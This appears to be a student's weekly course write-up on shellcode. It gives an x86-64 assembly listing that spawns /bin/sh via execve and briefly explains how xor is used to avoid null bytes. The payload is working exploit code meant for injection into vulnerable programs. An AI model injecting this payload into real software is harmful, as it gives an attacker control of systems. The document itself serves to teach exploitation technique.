# Shell Code - Week 8 

The purpose of this week was to write shellcode or code that we might inject into a program that when read will execute
and potentailly allow control of a system in this case we spawn a shell. 

``` asm
.global _start
.section .text 
_start:
    //xor to create the null values without null directly
    xor %rax, %rax 
    push %rax
    mov %rsp, %rsi
    mov %rsp, %rdx
    //load /bin/sh encoded in little endian
    mov $0x68732F6E69622F, %rbx
    push %rbx
    mov %rsp, %rdi  
    //load 3b for the execve call
    mov $0x3B, %rax  
    syscall
```

![image](https://user-images.githubusercontent.com/44854053/234171026-28f216c0-c759-4710-a368-66fe23bdf3eb.png)

![bytecountscript](./shellcode/bytecount.py)


In order to avoid null bytes the first thing I did was use xor to create a zero then stored that in the adress of that in the rsp.
